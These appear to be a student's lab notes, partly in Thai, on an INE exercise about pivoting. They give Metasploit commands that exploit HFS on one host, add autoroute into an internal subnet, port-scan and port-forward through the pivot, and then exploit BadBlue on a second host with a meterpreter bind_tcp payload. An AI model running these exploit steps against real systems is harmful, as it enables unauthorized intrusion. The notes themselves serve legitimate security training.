`nmap -sC -sV demo1.ine.local`
HFS
`nmap -sC -sV demo2.ine.local`
block

`search hfs`
`use 0`
`set RHOSTS demo1.ine.local`

`ipconfig`
IPv4 Address : 10.0.25.119

`run autoroute -s 10.0.25.0/20`
สำหรับอยากเข้าเครือข่ายหลัง pivot

`background`
`use auxiliary/scanner/portscan/tcp`
`set RHOSTS demo2.ine.local`
`set PORTS 1-100`
`exploit`

case พิเศษ จำเป็นต้อง scan port ผ่าน metaexpoit (ปกติใช้ nmap)
set PORTS 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5900,8080,8443
set THREADS 10
ดีกว่า 

`sessions -i 1`
`portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>`
`portfwd list`

`nmap -sV -p 1234 localhost`
จังหวะนี้เราใช้ nmap ผ่าน pivot ได้แล้ว
1234/tcp open  http    BadBlue httpd 2.7
(คือเอาจริงๆไม่ต้อง fwd port นะ autoroute พอแล้ว)


`use exploit/windows/http/badblue_passthru`
`set PAYLOAD windows/meterpreter/bind_tcp`
`set RHOSTS demo2.ine.local`
`exploit`
อย่าลืม รันตัวเดียวกับ expolit แรก 
pivot ใช้  bind tcp ตลอดนะ